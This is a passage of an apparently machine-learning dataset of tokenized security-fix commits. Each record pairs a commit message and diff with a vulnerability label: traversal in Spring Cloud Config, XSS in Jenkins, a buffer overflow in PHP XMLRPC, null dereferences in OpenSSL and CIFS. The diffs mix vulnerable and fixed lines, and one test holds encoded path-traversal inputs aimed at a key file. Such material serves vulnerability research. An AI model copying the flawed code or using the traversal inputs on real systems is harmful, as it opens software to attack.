"resources", "exists", "and", "is", "readable", ".", "The", "default", "implementation", "also", "verifies", "the", "*", "resource", "is", "either", "under", "the", "location", "relative", "to", "which", "it", "was", "found", "or", "is", "under", "*", "one", "of", "the", "{", "@", "link", "#", "setAllowedLocations", "allowed", "locations", "}", ".", "*", "@", "param", "resource", "the", "resource", "to", "check", "*", "@", "param", "location", "the", "location", "relative", "to", "which", "the", "resource", "was", "found", "*", "@", "param", "allowedLocations", "set", "of", "allowed", "locations", "*", "@", "return", "\"", "true", "\"", "if", "resource", "is", "in", "a", "valid", "location", ",", "\"", "false", "\"", "otherwise", ".", "*", "@", "throws", "IOException", "if", "Resource", "URLS", "fail", "to", "parse", ".", "*", "@", "since", "4", ".", "1", ".", "2", "*", "/", "public", "static", "boolean", "checkResource", "(", "Resource", "resource", ",", "Resource", "location", ",", "List", "<", "Resource", ">", "allowedLocations", ")", "throws", "IOException", "{", "if", "(", "isResourceUnderLocation", "(", "resource", ",", "location", ")", ")", "{", "return", "true", ";", "}", "if", "(", "allowedLocations", "!", "=", "null", ")", "{", "for", "(", "Resource", "current", ":", "allowedLocations", ")", "{", "if", "(", "isResourceUnderLocation", "(", "resource", ",", "current", ")", ")", "{", "return", "true", ";", "}", "}", "}", "if", "(", "logger", ".", "isWarnEnabled", "(", "))", "{", "logger", ".", "warn", "(", "\"", "Resource", "path", "\\", "\"\"", "+", "location", ".", "getURI", "(", ")", "+", "\"", "\\\"", "was", "successfully", "resolved", "\"", "+", "\"", "but", "resource", "\\", "\"\"", "+", "resource", ".", "getURL", "(", ")", "+", "\"", "\\\"", "is", "neither", "under", "the", "\"", "+", "\"", "current", "location", "\\", "\"\"", "+", "location", ".", "getURL", "(", ")", "+", "\"", "\\\"", "nor", "under", "any", "of", "the", "\"", "+", "\"", "allowed", "locations", "\"", "+", "(", "allowedLocations", "!", "=", "null", "?", "allowedLocations", ":", "\"", "[]", "\")", ");", "}", "return", "false", ";", "}", "private", "static", "boolean", "isResourceUnderLocation", "(", "Resource", "resource", ",", "Resource", "location", ")", "throws", "IOException", "{", "if", "(", "resource", ".", "getClass", "(", ")", "!", "=", "location", ".", "getClass", "(", "))", "{", "return", "false", ";", "}", "String", "resourcePath", ";", "String", "locationPath", ";", "if", "(", "resource", "instanceof", "UrlResource", ")", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "toExternalForm", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "location", ".", "getURL", "(", ").", "toString", "(", "))", ";", "}", "else", "if", "(", "resource", "instanceof", "ClassPathResource", ")", "{", "resourcePath", "=", "(", "(", "ClassPathResource", ")", "resource", ")", ".", "getPath", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "((", "ClassPathResource", ")", "location", ")", ".", "getPath", "(", "))", ";", "}", "else", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "getPath", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "location", ".", "getURL", "(", ").", "getPath", "(", "))", ";", "}", "if", "(", "locationPath", ".", "equals", "(", "resourcePath", ")", ")", "{", "return", "true", ";", "}", "locationPath", "=", "(", "locationPath", ".", "endsWith", "(", "\"/", "\")", "|", "|", "locationPath", ".", "isEmpty", "(", ")", "?", "locationPath", ":", "locationPath", "+", "\"", "/\"", ");", "return", "(", "resourcePath", ".", "startsWith", "(", "locationPath", ")", "&", "&", "!", "isInvalidEncodedPath", "(", "resourcePath", ")", ");", "}", "}", "@", "@", "-", "120", ",", "6", "+", "120", ",", "17", "@", "@", "public", "void", "invalidPathWithPreviousDirectoryAllEncoded", "(", ")", "{", "testInvalidPath", "(", "\"%", "2E", "%", "2E", "%", "2F", "\"", ");", "}", "@", "Test", "public", "void", "invalidPathEncodedSlash", "(", ")", "{", "String", "file", "=", "System", ".", "getProperty", "(", "\"", "user", ".", "dir", "\"", ");", "file", "=", "file", ".", "replaceFirst", "(", "\"\\", "\\/", "\",", "\"", "%", "2f", "\"", ");", "file", "+", "=", "\"", "/", "src", "/", "test", "/", "resources", "/", "ssh", "/", "key", "\"", ";", "this", ".", "exception", ".", "expect", "(", "NoSuchResourceException", ".", "class", ")", ";", "this", ".", "nativeRepository", ".", "setSearchLocations", "(", "\"", "file", ":", "./", "\")", ";", "this", ".", "output", ".", "expect", "(", "containsString", "(", "\"", "is", "neither", "under", "the", "current", "location", "\"", "))", ";", "this", ".", "repository", ".", "findOne", "(", "\"", "blah", "\"", ",", "\"", "local", "\"", ",", "\"", "master", "\"", ",", "file", ")", ";", "}", "private", "void", "testInvalidPath", "(", "String", "label", ")", "{", "this", ".", "exception", ".", "expect", "(", "NoSuchResourceException", ".", "class", ")", ";", "this", ".", "nativeRepository", ".", "setSearchLocations", "(", "\"", "file", ":", "./", "src", "/", "test", "/", "resources", "/", "test", "/", "local", "\"", ");"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["KVM:", "perform", "an", "invalid", "memslot", "step", "for", "gpa", "base", "change", "PPC", "must", "flush", "all", "translations", "before", "the", "new", "memory", "slot", "is", "visible.", "Signed-off-by:", "Marcelo", "Tosatti", "<mtosatti@redhat.com>", "Signed-off-by:", "Avi", "Kivity", "<avi@redhat.com>"], "code_tokens": ["@", "@", "-", "791", ",", "7", "+", "791", ",", "7", "@", "@", "int", "__kvm_set_memory_region", "(", "struct", "kvm", "*", "kvm", ",", "/", "*", "destroy", "any", "largepage", "mappings", "for", "dirty", "tracking", "*", "/", "}", "if", "(", "!", "npages", ")", "{", "if", "(", "!", "npages", "|", "|", "base_gfn", "!", "=", "old", ".", "base_gfn", ")", "{", "struct", "kvm_memory_slot", "*", "slot", ";", "r", "=", "-", "ENOMEM", ";", "@", "@", "-", "807", ",", "8", "+", "807", ",", "8", "@", "@", "int", "__kvm_set_memory_region", "(", "struct", "kvm", "*", "kvm", ",", "old_memslots", "=", "kvm", "-", ">", "memslots", ";", "rcu_assign_pointer", "(", "kvm", "-", ">", "memslots", ",", "slots", ")", ";", "synchronize_srcu_expedited", "(", "&", "kvm", "-", ">", "srcu", ")", ";", "/", "*", "From", "this", "point", "no", "new", "shadow", "pages", "pointing", "to", "a", "deleted", "*", "memslot", "will", "be", "created", ".", "/", "*", "From", "this", "point", "no", "new", "shadow", "pages", "pointing", "to", "a", "deleted", ",", "*", "or", "moved", ",", "memslot", "will", "be", "created", ".", "*", "*", "validation", "of", "sp", "-", ">", "gfn", "happens", "in", ":", "*", "-", "gfn_to_hva", "(", "kvm_read_guest", ",", "gfn_to_pfn", ")"], "docstring_tokens": ["memory", "leak"]}
{"contents": ["Fix", "bug", "#68027", "-", "fix", "date", "parsing", "in", "XMLRPC", "lib"], "code_tokens": ["@", "@", "-", "219", ",", "40", "+", "219", ",", "43", "@", "@", "static", "int", "date_from_ISO8601", "(", "const", "char", "*", "text", ",", "time_t", "*", "value", ")", "{", "n", "=", "10", ";", "tm", ".", "tm_mon", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "{", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "4", "]", ")", "tm", ".", "tm_mon", "+", "=", "(", "text", "[", "i", "+", "4", "]", "-'", "0", "'", ")*", "n", ";", "n", "/", "=", "10", ";", "}", "tm", ".", "tm_mon", "-", "-;", "if", "(", "tm", ".", "tm_mon", "<", "0", "|", "|", "tm", ".", "tm_mon", ">", "11", ")", "{", "return", "-", "1", ";", "}", "n", "=", "10", ";", "tm", ".", "tm_mday", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "{", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "6", "]", ")", "tm", ".", "tm_mday", "+", "=", "(", "text", "[", "i", "+", "6", "]", "-'", "0", "'", ")*", "n", ";", "n", "/", "=", "10", ";", "}", "n", "=", "10", ";", "tm", ".", "tm_hour", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "{", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "9", "]", ")", "tm", ".", "tm_hour", "+", "=", "(", "text", "[", "i", "+", "9", "]", "-'", "0", "'", ")*", "n", ";", "n", "/", "=", "10", ";", "}", "n", "=", "10", ";", "tm", ".", "tm_min", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "{", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "12", "]", ")", "tm", ".", "tm_min", "+", "=", "(", "text", "[", "i", "+", "12", "]", "-'", "0", "'", ")*", "n", ";", "n", "/", "=", "10", ";", "}", "n", "=", "10", ";", "tm", ".", "tm_sec", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "{", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "15", "]", ")", "tm", ".", "tm_sec", "+", "=", "(", "text", "[", "i", "+", "15", "]", "-'", "0", "'", ")*", "n", ";", "n", "/", "=", "10", ";", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "44", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "68027", "(", "buffer", "overflow", "in", "mkgmtime", "(", ")", "function", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "xmlrpc", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "d", "=", "'", "6", "-", "01", "-", "01", "20", ":", "00", ":", "00", "'", ";", "xmlrpc_set_type", "(", "$", "d", ",", "'", "datetime", "'", ");", "var_dump", "(", "$", "d", ")", ";", "$", "datetime", "=", "\"", "2001", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "\"", ";", "$", "obj", "=", "xmlrpc_decode", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", "><", "methodResponse", ">", "<", "params", ">", "<", "param", ">", "<", "value", ">", "<", "dateTime", ".", "iso8601", ">", "$", "datetime", "<", "/", "dateTime", ".", "iso8601", ">", "</", "value", ">", "</", "param", ">", "</", "params", ">", "</", "methodResponse", ">", "\")", ";", "print_r", "(", "$", "obj", ")", ";", "$", "datetime", "=", "\"", "34770", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "\"", ";", "$", "obj", "=", "xmlrpc_decode", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", "><", "methodResponse", ">", "<", "params", ">", "<", "param", ">", "<", "value", ">", "<", "dateTime", ".", "iso8601", ">", "$", "datetime", "<", "/", "dateTime", ".", "iso8601", ">", "</", "value", ">", "</", "param", ">", "</", "params", ">", "</", "methodResponse", ">", "\")", ";", "print_r", "(", "$", "obj", ")", ";", "echo", "\"", "Done", "\\", "n", "\"", ";", "?", ">", "-", "-", "EXPECTF", "-", "-", "object", "(", "stdClass", ")", "#", "1", "(", "3", ")", "{", "[", "\"", "scalar", "\"", "]=", ">", "string", "(", "16", ")", "\"", "6", "-", "01", "-", "01", "20", ":", "00", ":", "00", "\"", "[", "\"", "xmlrpc_type", "\"", "]=", ">", "string", "(", "8", ")", "\"", "datetime", "\"", "[", "\"", "timestamp", "\"", "]=", ">", "int", "(", "%", "d", ")", "}", "stdClass", "Object", "(", "[", "scalar", "]", "=", ">", "2001", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "[", "xmlrpc_type", "]", "=", ">", "datetime", "[", "timestamp", "]", "=", ">", "%", "s", ")", "stdClass", "Object", "(", "[", "scalar", "]", "=", ">", "34770", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "[", "xmlrpc_type", "]", "=", ">", "datetime", "[", "timestamp", "]", "=", ">", "%", "d", ")", "Done"], "docstring_tokens": ["a", "buffer", "overflow"]}
{"contents": ["PKCS#7:", "Fix", "NULL", "dereference", "with", "missing", "EncryptedContent.", "Reviewed-by:", "Rich", "Salz", "<rsalz@openssl.org>"], "code_tokens": ["@", "@", "-", "432", ",", "6", "+", "432", ",", "12", "@", "@", "BIO", "*", "PKCS7_dataDecode", "(", "PKCS7", "*", "p7", ",", "EVP_PKEY", "*", "pkey", ",", "BIO", "*", "in_bio", ",", "X509", "*", "pcert", ")", "switch", "(", "i", ")", "{", "case", "NID_pkcs7_signed", ":", "/", "*", "*", "p7", "-", ">", "d", ".", "sign", "-", ">", "contents", "is", "a", "PKCS7", "structure", "consisting", "of", "a", "contentType", "*", "field", "and", "optional", "content", ".", "*", "data_body", "is", "NULL", "if", "that", "structure", "has", "no", "(", "=", "detached", ")", "content", "*", "or", "if", "the", "contentType", "is", "wrong", "(", "i", ".", "e", ".", ",", "not", "\"", "data", "\"", ").", "*", "/", "data_body", "=", "PKCS7_get_octet_string", "(", "p7", "-", ">", "d", ".", "sign", "-", ">", "contents", ")", ";", "if", "(", "!", "PKCS7_is_detached", "(", "p7", ")", "&", "&", "data_body", "=", "=", "NULL", ")", "{", "PKCS7err", "(", "PKCS7_F_PKCS7_DATADECODE", ",", "@", "@", "-", "443", ",", "6", "+", "449", ",", "7", "@", "@", "BIO", "*", "PKCS7_dataDecode", "(", "PKCS7", "*", "p7", ",", "EVP_PKEY", "*", "pkey", ",", "BIO", "*", "in_bio", ",", "X509", "*", "pcert", ")", "case", "NID_pkcs7_signedAndEnveloped", ":", "rsk", "=", "p7", "-", ">", "d", ".", "signed_and_enveloped", "-", ">", "recipientinfo", ";", "md_sk", "=", "p7", "-", ">", "d", ".", "signed_and_enveloped", "-", ">", "md_algs", ";", "/", "*", "data_body", "is", "NULL", "if", "the", "optional", "EncryptedContent", "is", "missing", ".", "*", "/", "data_body", "=", "p7", "-", ">", "d", ".", "signed_and_enveloped", "-", ">", "enc_data", "-", ">", "enc_data", ";", "enc_alg", "=", "p7", "-", ">", "d", ".", "signed_and_enveloped", "-", ">", "enc_data", "-", ">", "algorithm", ";", "evp_cipher", "=", "EVP_get_cipherbyobj", "(", "enc_alg", "-", ">", "algorithm", ")", ";", "@", "@", "-", "455", ",", "6", "+", "462", ",", "7", "@", "@", "BIO", "*", "PKCS7_dataDecode", "(", "PKCS7", "*", "p7", ",", "EVP_PKEY", "*", "pkey", ",", "BIO", "*", "in_bio", ",", "X509", "*", "pcert", ")", "case", "NID_pkcs7_enveloped", ":", "rsk", "=", "p7", "-", ">", "d", ".", "enveloped", "-", ">", "recipientinfo", ";", "enc_alg", "=", "p7", "-", ">", "d", ".", "enveloped", "-", ">", "enc_data", "-", ">", "algorithm", ";", "/", "*", "data_body", "is", "NULL", "if", "the", "optional", "EncryptedContent", "is", "missing", ".", "*", "/", "data_body", "=", "p7", "-", ">", "d", ".", "enveloped", "-", ">", "enc_data", "-", ">", "enc_data", ";", "evp_cipher", "=", "EVP_get_cipherbyobj", "(", "enc_alg", "-", ">", "algorithm", ")", ";", "if", "(", "evp_cipher", "=", "=", "NULL", ")", "{", "@", "@", "-", "468", ",", "6", "+", "476", ",", "12", "@", "@", "BIO", "*", "PKCS7_dataDecode", "(", "PKCS7", "*", "p7", ",", "EVP_PKEY", "*", "pkey", ",", "BIO", "*", "in_bio", ",", "X509", "*", "pcert", ")", "goto", "err", ";", "}", "/", "*", "Detached", "content", "must", "be", "supplied", "via", "in_bio", "instead", ".", "*", "/", "if", "(", "data_body", "=", "=", "NULL", "&", "&", "in_bio", "=", "=", "NULL", ")", "{", "PKCS7err", "(", "PKCS7_F_PKCS7_DATADECODE", ",", "PKCS7_R_NO_CONTENT", ")", ";", "goto", "err", ";", "}", "/", "*", "We", "will", "be", "checking", "the", "signature", "*", "/", "if", "(", "md_sk", "!", "=", "NULL", ")", "{", "for", "(", "i", "=", "0", ";", "i", "<", "sk_X509_ALGOR_num", "(", "md_sk", ")", ";", "i", "+", "+)", "{", "@", "@", "-", "593", ",", "7", "+", "607", ",", "7", "@", "@", "BIO", "*", "PKCS7_dataDecode", "(", "PKCS7", "*", "p7", ",", "EVP_PKEY", "*", "pkey", ",", "BIO", "*", "in_bio", ",", "X509", "*", "pcert", ")", "BIO_push", "(", "out", ",", "etmp", ")", ";", "etmp", "=", "NULL", ";", "}", "if", "(", "PKCS7_is_detached", "(", "p7", ")", "|", "|", "(", "in_bio", "!", "=", "NULL", ")", ")", "{", "if", "(", "in_bio", "!", "=", "NULL", ")", "{", "bio", "=", "in_bio", ";", "}", "else", "{", "if", "(", "data_body", "-", ">", "length", ">", "0", ")"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[CIFS]", "Allow", "null", "nd", "(as", "nfs", "server", "uses)", "on", "create", "While", "creating", "a", "file", "on", "a", "server", "which", "supports", "unix", "extensions", "such", "as", "Samba,", "if", "a", "file", "is", "being", "created", "which", "does", "not", "supply", "nameidata", "(i.e.", "nd", "is", "null),", "cifs", "client", "can", "oops", "when", "calling", "cifs_posix_open.", "Signed-off-by:", "Shirish", "Pargaonkar", "<shirishp@us.ibm.com>", "Signed-off-by:", "Steve", "French", "<sfrench@us.ibm.com>"], "code_tokens": ["@", "@", "-", "107", ",", "8", "+", "107", ",", "10", "@", "@", "extern", "struct", "cifsFileInfo", "*", "cifs_new_fileinfo", "(", "struct", "inode", "*", "newinode", ",", "__u16", "fileHandle", ",", "struct", "file", "*", "file", ",", "struct", "vfsmount", "*", "mnt", ",", "unsigned", "int", "oflags", ")", ";", "extern", "int", "cifs_posix_open", "(", "char", "*", "full_path", ",", "struct", "inode", "*", "*", "pinode", ",", "struct", "vfsmount", "*", "mnt", ",", "int", "mode", ",", "int", "oflags", ",", "__u32", "*", "poplock", ",", "__u16", "*", "pnetfid", ",", "int", "xid", ")", ";", "struct", "vfsmount", "*", "mnt", ",", "struct", "super_block", "*", "sb", ",", "int", "mode", ",", "int", "oflags", ",", "__u32", "*", "poplock", ",", "__u16", "*", "pnetfid", ",", "int", "xid", ")", ";", "extern", "void", "cifs_unix_basic_to_fattr", "(", "struct", "cifs_fattr", "*", "fattr", ",", "FILE_UNIX_BASIC_INFO", "*", "info", ",", "struct", "cifs_sb_info", "*", "cifs_sb", ")", ";", "@", "@", "-", "182", ",", "13", "+", "182", ",", "14", "@", "@", "cifs_new_fileinfo", "(", "struct", "inode", "*", "newinode", ",", "__u16", "fileHandle", ",", "}", "int", "cifs_posix_open", "(", "char", "*", "full_path", ",", "struct", "inode", "*", "*", "pinode", ",", "struct", "vfsmount", "*", "mnt", ",", "int", "mode", ",", "int", "oflags", ",", "__u32", "*", "poplock", ",", "__u16", "*", "pnetfid", ",", "int", "xid", ")", "struct", "vfsmount", "*", "mnt", ",", "struct", "super_block", "*", "sb", ",", "int", "mode", ",", "int", "oflags", ",", "__u32", "*", "poplock", ",", "__u16", "*", "pnetfid", ",", "int", "xid", ")", "{", "int", "rc", ";", "FILE_UNIX_BASIC_INFO", "*", "presp_data", ";", "__u32", "posix_flags", "=", "0", ";", "struct", "cifs_sb_info", "*", "cifs_sb", "=", "CIFS_SB", "(", "mnt", "-", ">", "mnt_sb", ")", ";", "struct", "cifs_sb_info", "*", "cifs_sb", "=", "CIFS_SB", "(", "sb", ")", ";", "struct", "cifs_fattr", "fattr", ";", "cFYI", "(", "1", ",", "\"", "posix", "open", "%", "s", "\"", ",", "full_path", ")", ";", "@", "@", "-", "241", ",", "7", "+", "242", ",", "7", "@", "@", "int", "cifs_posix_open", "(", "char", "*", "full_path", ",", "struct", "inode", "*", "*", "pinode", ",", "/", "*", "get", "new", "inode", "and", "set", "it", "up", "*", "/", "if", "(", "*", "pinode", "=", "=", "NULL", ")", "{", "*", "pinode", "=", "cifs_iget", "(", "mnt", "-", ">", "mnt_sb", ",", "&", "fattr", ")", ";", "*", "pinode", "=", "cifs_iget", "(", "sb", ",", "&", "fattr", ")", ";", "if", "(", "!*", "pinode", ")", "{", "rc", "=", "-", "ENOMEM", ";", "goto", "posix_open_ret", ";", "@", "@", "-", "250", ",", "7", "+", "251", ",", "8", "@", "@", "int", "cifs_posix_open", "(", "char", "*", "full_path", ",", "struct", "inode", "*", "*", "pinode", ",", "cifs_fattr_to_inode", "(", "*", "pinode", ",", "&", "fattr", ")", ";", "}", "cifs_new_fileinfo", "(", "*", "pinode", ",", "*", "pnetfid", ",", "NULL", ",", "mnt", ",", "oflags", ")", ";", "if", "(", "mnt", ")", "cifs_new_fileinfo", "(", "*", "pinode", ",", "*", "pnetfid", ",", "NULL", ",", "mnt", ",", "oflags", ")", ";", "posix_open_ret", ":", "kfree", "(", "presp_data", ")", ";", "@", "@", "-", "314", ",", "13", "+", "316", ",", "14", "@", "@", "cifs_create", "(", "struct", "inode", "*", "inode", ",", "struct", "dentry", "*", "direntry", ",", "int", "mode", ",", "if", "(", "nd", "&", "&", "(", "nd", "-", ">", "flags", "&", "LOOKUP_OPEN", ")", ")", "oflags", "=", "nd", "-", ">", "intent", ".", "open", ".", "flags", ";", "else", "oflags", "=", "FMODE_READ", ";", "oflags", "=", "FMODE_READ", "|", "SMB_O_CREAT", ";", "if", "(", "tcon", "-", ">", "unix_ext", "&", "&", "(", "tcon", "-", ">", "ses", "-", ">", "capabilities", "&", "CAP_UNIX", ")", "&", "&", "(", "CIFS_UNIX_POSIX_PATH_OPS_CAP", "&", "le64_to_cpu", "(", "tcon", "-", ">", "fsUnixInfo", ".", "Capability", ")", "))", "{", "rc", "=", "cifs_posix_open", "(", "full_path", ",", "&", "newinode", ",", "nd", "-", ">", "path", ".", "mnt", ",", "mode", ",", "oflags", ",", "&", "oplock", ",", "&", "fileHandle", ",", "xid", ")", ";", "rc", "=", "cifs_posix_open", "(", "full_path", ",", "&", "newinode", ",", "nd", "?", "nd", "-", ">", "path", ".", "mnt", ":", "NULL", ",", "inode", "-", ">", "i_sb", ",", "mode", ",", "oflags", ",", "&", "oplock", ",", "&", "fileHandle", ",", "xid", ")", ";", "/", "*", "EIO", "could", "indicate", "that", "(", "posix", "open", ")", "operation", "is", "not", "supported", ",", "despite", "what", "server", "claimed", "in", "capability", "negotation", ".", "EREMOTE", "indicates", "DFS", "junction", ",", "which", "is", "not", "@", "@", "-", "677", ",", "6", "+", "680", ",", "7", "@", "@", "cifs_lookup", "(", "struct", "inode", "*", "parent_dir_inode", ",", "struct", "dentry", "*", "direntry", ",", "(", "nd", "-", ">", "flags", "&", "LOOKUP_OPEN", ")", "&", "&", "!", "pTcon", "-", ">", "broken_posix_open", "&", "&", "(", "nd", "-", ">", "intent", ".", "open", ".", "flags", "&", "O_CREAT", ")", ")", "{", "rc", "=", "cifs_posix_open", "(", "full_path", ",", "&", "newInode", ",", "nd", "-", ">", "path", ".", "mnt", ",", "parent_dir_inode", "-", ">", "i_sb", ",", "nd", "-", ">", "intent", ".", "open", ".", "create_mode", ",", "nd", "-", ">", "intent", ".", "open", ".", "flags", ",", "&", "oplock", ",", "&", "fileHandle", ",", "xid", ")", ";", "@", "@", "-", "298", ",", "10", "+", "298", ",", "12", "@", "@", "int", "cifs_open", "(", "struct", "inode", "*", "inode", ",", "struct", "file", "*", "file", ")", "(", "CIFS_UNIX_POSIX_PATH_OPS_CAP", "&", "le64_to_cpu", "(", "tcon", "-", ">", "fsUnixInfo", ".", "Capability", ")", "))", "{", "int", "oflags", "=", "(", "int", ")", "cifs_posix_convert_flags", "(", "file", "-", ">", "f_flags", ")", ";", "oflags", "|", "=", "SMB_O_CREAT", ";", "/", "*", "can", "not", "refresh", "inode", "info", "since", "size", "could", "be", "stale", "*", "/", "rc", "=", "cifs_posix_open", "(", "full_path", ",", "&", "inode", ",", "file", "-", ">", "f_path", ".", "mnt", ",", "cifs_sb", "-", ">", "mnt_file_mode", "/", "*", "ignored", "*", "/,", "oflags", ",", "&", "oplock", ",", "&", "netfid", ",", "xid", ")", ";", "inode", "-", ">", "i_sb", ",", "cifs_sb", "-", ">", "mnt_file_mode", "/", "*", "ignored", "*", "/,", "oflags", ",", "&", "oplock", ",", "&", "netfid", ",", "xid", ")", ";", "if", "(", "rc", "=", "=", "0", ")", "{", "cFYI", "(", "1", ",", "\"", "posix", "open", "succeeded", "\"", ");", "/", "*", "no", "need", "for", "special", "case", "handling", "of", "setting", "mode", "@", "@", "-", "513", ",", "8", "+", "515", ",", "9", "@", "@", "static", "int", "cifs_reopen_file", "(", "struct", "file", "*", "file", ",", "bool", "can_flush", ")", "int", "oflags", "=", "(", "int", ")", "cifs_posix_convert_flags", "(", "file", "-", ">", "f_flags", ")", ";", "/", "*", "can", "not", "refresh", "inode", "info", "since", "size", "could", "be", "stale", "*", "/", "rc", "=", "cifs_posix_open", "(", "full_path", ",", "NULL", ",", "file", "-", ">", "f_path", ".", "mnt", ",", "cifs_sb", "-", ">", "mnt_file_mode", "/", "*", "ignored", "*", "/,", "oflags", ",", "&", "oplock", ",", "&", "netfid", ",", "xid", ")", ";", "inode", "-", ">", "i_sb", ",", "cifs_sb", "-", ">", "mnt_file_mode", "/", "*", "ignored", "*", "/,", "oflags", ",", "&", "oplock", ",", "&", "netfid", ",", "xid", ")", ";", "if", "(", "rc", "=", "=", "0", ")", "{", "cFYI", "(", "1", ",", "\"", "posix", "reopen", "succeeded", "\"", ");", "goto", "reopen_success", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[SECURITY-944]"], "code_tokens": ["@", "@", "-", "23", ",", "6", "+", "23", ",", "7", "@", "@", "*", "/", "package", "hudson", ".", "model", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "util", ".", "RunList", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "@", "@", "-", "64", ",", "7", "+", "65", ",", "9", "@", "@", "public", "TimelineEventList", "doData", "(", "StaplerRequest", "req", ",", "@", "QueryParameter", "long", "min", ",", "@", "Q", "Event", "e", "=", "new", "Event", "(", ");", "e", ".", "start", "=", "new", "Date", "(", "r", ".", "getStartTimeInMillis", "(", "))", ";", "e", ".", "end", "=", "new", "Date", "(", "r", ".", "getStartTimeInMillis", "(", ")+", "r", ".", "getDuration", "(", "))", ";", "e", ".", "title", "=", "r", ".", "getFullDisplayName", "(", ");", "/", "/", "due", "to", "SimileAjax", ".", "HTML", ".", "deEntify", "(", "in", "simile", "-", "ajax", "-", "bundle", ".", "js", ")", ",", "\"", "&", "lt", ";", "\"", "are", "transformed", "back", "to", "\"", "<\"", ",", "but", "not", "the", "\"", "&#", "60", "\"", ";", "/", "/", "to", "protect", "against", "XSS", "e", ".", "title", "=", "Util", ".", "escape", "(", "r", ".", "getFullDisplayName", "(", "))", ".", "replace", "(", "\"&", "lt", ";", "\",", "\"", "&#", "60", ";", "\")", ";", "/", "/", "what", "to", "put", "in", "the", "description", "?", "/", "/", "e", ".", "description", "=", "\"", "Longish", "description", "of", "event", "\"", "+", "r", ".", "getFullDisplayName", "(", ");", "/", "/", "e", ".", "durationEvent", "=", "true", ";", "@", "@", "-", "56", ",", "7", "+", "56", ",", "7", "@", "@", "THE", "SOFTWARE", ".", "onSuccess", ":", "function", "(", "t", ")", "{", "if", "(", "t", ".", "status", "!", "=", "0", ")", "{", "try", "{", "eventSource1", ".", "loadJSON", "(", "eval", "(", "'(", "'+", "t", ".", "responseText", "+", "')", "')", ",'", ".'", ");", "eventSource1", ".", "loadJSON", "(", "JSON", ".", "parse", "(", "t", ".", "responseText", ")", ",'", ".'", ");", "getData", "(", "eventSource1", ",", "current", "-", "1", ",", "min", ",", "max", ")", ";", "}", "catch", "(", "e", ")", "{", "alert", "(", "e", ")", ";"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["USB:", "mct_u232:", "add", "sanity", "checking", "in", "probe", "An", "attack", "using", "the", "lack", "of", "sanity", "checking", "in", "probe", "is", "known.", "This", "patch", "checks", "for", "the", "existence", "of", "a", "second", "port.", "Signed-off-by:", "Oliver", "Neukum", "<ONeukum@suse.com>", "CC:", "stable@vger.kernel.org", "[johan:", "add", "error", "message", "]", "Signed-off-by:", "Johan", "Hovold", "<johan@kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "376", ",", "14", "+", "376", ",", "21", "@", "@", "static", "void", "mct_u232_msr_to_state", "(", "struct", "usb_serial_port", "*", "port", ",", "static", "int", "mct_u232_port_probe", "(", "struct", "usb_serial_port", "*", "port", ")", "{", "struct", "usb_serial", "*", "serial", "=", "port", "-", ">", "serial", ";", "struct", "mct_u232_private", "*", "priv", ";", "/", "*", "check", "first", "to", "simplify", "error", "handling", "*", "/", "if", "(", "!", "serial", "-", ">", "port", "[", "1", "]", "|", "|", "!", "serial", "-", ">", "port", "[", "1", "]", "->", "interrupt_in_urb", ")", "{", "dev_err", "(", "&", "port", "-", ">", "dev", ",", "\"", "expected", "endpoint", "missing", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "priv", "=", "kzalloc", "(", "sizeof", "(", "*", "priv", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "priv", ")", "return", "-", "ENOMEM", ";", "/", "*", "Use", "second", "interrupt", "-", "in", "endpoint", "for", "reading", ".", "*", "/", "priv", "-", ">", "read_urb", "=", "port", "-", ">", "serial", "-", ">", "port", "[", "1", "]", "->", "interrupt_in_urb", ";", "priv", "-", ">", "read_urb", "=", "serial", "-", ">", "port", "[", "1", "]", "->", "interrupt_in_urb", ";", "priv", "-", ">", 